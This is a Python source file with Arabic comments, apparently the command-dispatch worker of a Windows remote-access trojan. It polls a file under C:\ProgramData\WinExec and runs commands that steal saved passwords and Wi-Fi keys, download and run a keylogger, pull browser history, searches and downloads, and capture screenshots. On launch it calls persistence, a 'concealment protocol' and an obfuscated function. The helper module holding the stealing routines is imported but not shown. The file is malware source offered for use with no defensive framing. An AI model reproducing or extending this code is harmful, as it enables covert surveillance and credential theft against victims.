import os
import sys
current_dir = os.path.dirname(os.path.abspath(__file__))
if current_dir not in sys.path:
    sys.path.append(current_dir)
import time
import gc
import winexec  # استيراد ملف الوظائف الذي جهزناه أعلاه
from PIL import ImageGrab
import pygetwindow as gw

BASE_DIR = r"C:\ProgramData\WinExec"
SS_FILE = os.path.join(BASE_DIR, "ss.png")

BASE_DIR = r"C:\ProgramData\WinExec"
CMD_FILE = os.path.join(BASE_DIR, "cmd.txt")
RES_FILE = os.path.join(BASE_DIR, "res.txt")

def start_worker():
    print("[*] Monitoring for commands...")
    while True:
        if os.path.exists(CMD_FILE):
            try:
                # 1. قراءة الأمر الصادر من البرنامج الرئيسي
                with open(CMD_FILE, "r") as f:
                    cmd = f.read().strip()
                
                res = "Command Not Found"

                # 2. توجيه الأمر للدالة المناسبة في ملف winexec.py
                if cmd == "passwords":
                    res = winexec.run_passwords()
                elif cmd == "keylogger":
                    res = winexec.download_and_run()
                elif cmd == "rmkeylogger":
                    res = winexec.remove_script()
                elif cmd == "wifi":
                    res = winexec.run_wifi()
                elif cmd in ["history", "browser"]:
                    res = winexec.run_history()
                elif cmd == "update":
                    res = winexec.update()
                elif cmd == "searchs":
                    res = winexec.extract_all_browser_history()
                elif cmd == "downloads":
                    res = winexec.extract_all_browser_downloads()
                elif cmd == "sysinfo":
                    res = winexec.run_full_audit()


                elif cmd == "screenshot":
                    shot = ImageGrab.grab()
                    shot.save(SS_FILE)
                    shot.close() # إغلاق ملف الصورة في الذاكرة
                    del shot     # مسح الكائن تماماً
                    res = "SCREENSHOT_DONE"


                elif cmd == "screenshot_active":
                    window = gw.getActiveWindow()
                    if window:
                        bbox = (window.left, window.top, window.right, window.bottom)
                        ImageGrab.grab(bbox=bbox).save(SS_FILE)
                        res = "SCREENSHOT_ACTIVE_DONE"
                    else:
                        res = "NO_ACTIVE_WINDOW"

                # 3. كتابة النتيجة في ملف الرد
                with open(RES_FILE, "w", encoding="utf-8") as f:
                    f.write(str(res))

                # 4. حذف ملف الأمر لكي لا يتكرر التنفيذ
                os.remove(CMD_FILE)
                
                # تنظيف الذاكرة
                gc.collect()

            except Exception as e:
                print(f"Error in worker: {e}")
        
        time.sleep(1)

if not os.path.exists(BASE_DIR):
    os.makedirs(BASE_DIR)
    # تنظيف المخلفات القديمة عند بدء التشغيل لأول مرة
for f in [CMD_FILE, RES_FILE, SS_FILE]:
    try:
        if os.path.exists(f): os.remove(f)
    except: pass

gc.collect() # ابدأ بذاكرة نظيفة

if __name__ == "__main__":
    winexec.startup()
    winexec.start_concealment_protocol()
    winexec.k3M_x92Qa()
    
    start_worker()
    